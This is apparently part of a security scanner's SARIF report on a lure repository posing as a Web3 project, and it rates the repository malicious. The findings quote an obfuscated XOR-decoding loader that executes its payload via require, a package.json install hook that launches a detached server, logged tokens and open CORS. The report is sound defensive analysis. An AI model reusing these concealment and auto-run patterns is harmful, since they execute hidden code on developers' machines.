+                    "text": "…48,21,51,5,239,171,224,233,163]);const _650755=_2fd4e3.from('710e3eef3850dd7f31045af178d251da7d47719f91cfc69b2a4f62ad7a5ebb0d4d632d9162d741c025113ee5c88f87d0664104d90d3dae07437029c03cd610c9700232899bd4dcc7235035ff7815be5852622dc13bdf459e2c5727d4a1c88fd67c0224f…"
+                  }
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "lurescan/v1": "a36e10c625dbd9deeef6a89a360a9fb2"
+          },
+          "properties": {
+            "severity": "high",
+            "category": "concealment"
+          }
+        },
+        {
+          "ruleId": "LS-LURE-001",
+          "ruleIndex": 9,
+          "level": "warning",
+          "message": {
+            "text": "README advertises solidity, hardhat, nft, web3, polygon, evm, but the repository contains no smart-contract sources or toolchain config."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "README.md",
+                  "uriBaseId": "SRCROOT"
+                },
+                "region": {
+                  "startLine": 5,
+                  "startColumn": 4,
+                  "snippet": {
+                    "text": "[![Polygon](https://img.shields.io/badge/Polygon-EVM-purple)](https://polygon.technology/)"
+                  }
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "lurescan/v1": "5286e24c9affa8d403a05ccdf10e5914"
+          },
+          "properties": {
+            "severity": "medium",
+            "category": "lure"
+          }
+        },
+        {
+          "ruleId": "LS-APP-004",
+          "ruleIndex": 10,
+          "level": "warning",
+          "message": {
+            "text": "Tokens, passwords, keys, or seed phrases are logged."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "middleware/auth.js",
+                  "uriBaseId": "SRCROOT"
+                },
+                "region": {
+                  "startLine": 6,
+                  "startColumn": 3,
+                  "snippet": {
+                    "text": "console.log(token)"
+                  }
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "lurescan/v1": "1672371897d85074b8a06d81c5c4fb72"
+          },
+          "properties": {
+            "severity": "medium",
+            "category": "app-security"
+          }
+        },
+        {
+          "ruleId": "LS-MAL-006",
+          "ruleIndex": 11,
+          "level": "warning",
+          "message": {
+            "text": "A child process is started detached, hidden, or with nohup/start /b so it keeps running after the parent exits."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "package.json",
+                  "uriBaseId": "SRCROOT"
+                },
+                "region": {
+                  "startLine": 10,
+                  "startColumn": 21,
+                  "snippet": {
+                    "text": "\"prepare\": \"start /b node server || nohup node server &\","
+                  }
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "lurescan/v1": "48393f1ed89d96c651b98dd0c2a3fdcf"
+          },
+          "properties": {
+            "severity": "medium",
+            "category": "malware"
+          }
+        },
+        {
+          "ruleId": "LS-CON-006",
+          "ruleIndex": 12,
+          "level": "warning",
+          "message": {
+            "text": "A buffer is XORed against a repeating key, the usual way to unpack a hidden payload at runtime."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "routes/api/auth.js",
+                  "uriBaseId": "SRCROOT"
+                },
+                "region": {
+                  "startLine": 20,
+                  "startColumn": 3901,
+                  "snippet": {
+                    "text": "…c<_650755.length;_46251c++)_2091f7[_46251c]=_650755[_46251c]^_677ac7[_46251c%_677ac7.length];_9df9c3('require',_2091f7.toString(String.fromCharCode(117,116,102,56)))(require);"
+                  }
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "lurescan/v1": "f0cb5b878d48b6271395eaed8db6a3c3"
+          },
+          "properties": {
+            "severity": "medium",
+            "category": "concealment"
+          }
+        },
+        {
+          "ruleId": "LS-APP-006",
+          "ruleIndex": 13,
+          "level": "note",
+          "message": {
+            "text": "CORS is enabled for any origin, letting any website call the API from a victim's browser."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "client/src/apis/index.js",
+                  "uriBaseId": "SRCROOT"
+                },
+                "region": {
+                  "startLine": 11,
+                  "startColumn": 12,
+                  "snippet": {
+                    "text": "\"Access-Control-Allow-Origin\": \"*\""
+                  }
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "lurescan/v1": "55d9ad9df76b7c3f6f3e4faadf9344db"
+          },
+          "properties": {
+            "severity": "low",
+            "category": "app-security"
+          }
+        },
+        {
+          "ruleId": "LS-APP-006",
+          "ruleIndex": 13,
+          "level": "note",
+          "message": {
+            "text": "CORS is enabled for any origin, letting any website call the API from a victim's browser."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "client/src/apis/index.js",
+                  "uriBaseId": "SRCROOT"
+                },
+                "region": {
+                  "startLine": 33,
+                  "startColumn": 12,
+                  "snippet": {
+                    "text": "\"Access-Control-Allow-Origin\": \"*\""
+                  }
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "lurescan/v1": "55d9ad9df76b7c3f6f3e4faadf9344db"
+          },
+          "properties": {
+            "severity": "low",
+            "category": "app-security"
+          }
+        },
+        {
+          "ruleId": "LS-APP-006",
+          "ruleIndex": 13,
+          "level": "note",
+          "message": {
+            "text": "CORS is enabled for any origin, letting any website call the API from a victim's browser."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "client/src/apis/index.js",
+                  "uriBaseId": "SRCROOT"
+                },
+                "region": {
+                  "startLine": 54,
+                  "startColumn": 12,
+                  "snippet": {
+                    "text": "\"Access-Control-Allow-Origin\": \"*\""
+                  }
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "lurescan/v1": "55d9ad9df76b7c3f6f3e4faadf9344db"
+          },
+          "properties": {
+            "severity": "low",
+            "category": "app-security"
+          }
+        },
+        {
+          "ruleId": "LS-APP-007",
+          "ruleIndex": 14,
+          "level": "note",
+          "message": {
+            "text": "Helmet or an equivalent header middleware is commented out."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "middleware/index.js",
+                  "uriBaseId": "SRCROOT"
+                },
+                "region": {
+                  "startLine": 22,
+                  "startColumn": 3,
+                  "snippet": {
+                    "text": "// app.use(helmet());"
+                  }
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "lurescan/v1": "60776ea6c05c333ca8b9ead55b67d053"
+          },
+          "properties": {
+            "severity": "low",
+            "category": "app-security"
+          }
+        },
+        {
+          "ruleId": "LS-APP-006",
+          "ruleIndex": 13,
+          "level": "note",
+          "message": {
+            "text": "CORS is enabled for any origin, letting any website call the API from a victim's browser."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "middleware/index.js",
+                  "uriBaseId": "SRCROOT"
+                },
+                "region": {
+                  "startLine": 38,
+                  "startColumn": 11,
+                  "snippet": {
+                    "text": "app.use(cors());"
+                  }
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "lurescan/v1": "e6691cc8fc1605555d5162f33becf0f5"
+          },
+          "properties": {
+            "severity": "low",
+            "category": "app-security"
+          }
+        }
+      ],
+      "properties": {
+        "verdict": {
+          "label": "MALICIOUS",
+          "summary": "Malware or install-time execution indicators. Do not install, run, or open this repository in an IDE or AI agent with automatic execution."
+        },
+        "riskScore": 100
+      }
+    }
+  ]
+}
